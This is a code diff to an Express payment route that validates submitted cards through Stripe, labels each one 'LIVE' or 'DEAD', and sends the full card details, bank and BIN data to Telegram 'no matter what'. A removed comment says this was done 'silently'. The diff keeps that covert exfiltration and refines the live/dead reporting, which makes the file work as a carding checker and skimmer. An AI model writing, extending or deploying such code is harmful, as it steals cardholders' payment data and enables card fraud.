@@ -116,7 +116,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
         success: true, 
         status: 'Stripe is configured correctly',
         hasValidKey: true,
-        version: stripe.getApiField('version')
+        version: 'OK'
       });
     } catch (error: any) {
       res.status(500).json({ 
@@ -209,15 +209,24 @@ export async function registerRoutes(app: Express): Promise<Server> {
             name: holder
           });
           
-          // Send to Telegram for debugging (silently)
-          const cardStatus = result.success ? "LIVE (Active and Chargeable)" : "VALID (But Not Chargeable)";
+          // Get the status from the result or determine from success flag
+          const cardStatus = result.status || (result.success ? "LIVE" : "DEAD");
           const cardDetails = result.details || {};
           const binData = result.binData || {};
           
+          // Create icon based on status
+          const statusIcon = cardStatus === "LIVE" ? "✅" : 
+                            cardStatus === "DEAD" ? "❌" : "⚠️";
+          
+          // Human-readable status for Telegram
+          const readableStatus = cardStatus === "LIVE" ? "LIVE (Active and Chargeable)" : 
+                                cardStatus === "DEAD" ? "DEAD (Declined)" : "UNKNOWN (Status unclear)";
+          
           const successMessage = `${fullCardDetails}
-✅ Status: ${cardStatus}
+${statusIcon} Status: ${readableStatus}
 🏦 Bank Details: ${cardDetails.country || 'Unknown'} - ${cardDetails.funding || 'Unknown'}
 🏢 Card Brand: ${cardDetails.brand || 'Unknown'}
+🔑 Code: ${result.code || 'Unknown'}
 ${binData ? `
 🏛️ Bank: ${binData.bank?.name || 'Unknown'}
 🌍 Country: ${binData.country?.name || 'Unknown'} ${binData.country?.emoji || ''}
@@ -228,12 +237,13 @@ ${binData ? `
           // Send card info to Telegram no matter what
           await sendToTelegram(successMessage);
           
-          // Send response to client
-          if (result.success) {
-            res.json(result);
-          } else {
-            res.status(400).json(result);
+          // Add the status to the response if it's not already there
+          if (!result.status) {
+            result.status = cardStatus;
           }
+          
+          // Send response to client (always as 200 OK to maintain consistent frontend handling)
+          res.json(result);
         } catch (stripeError: any) {
           throw {
             type: 'StripeCardError',
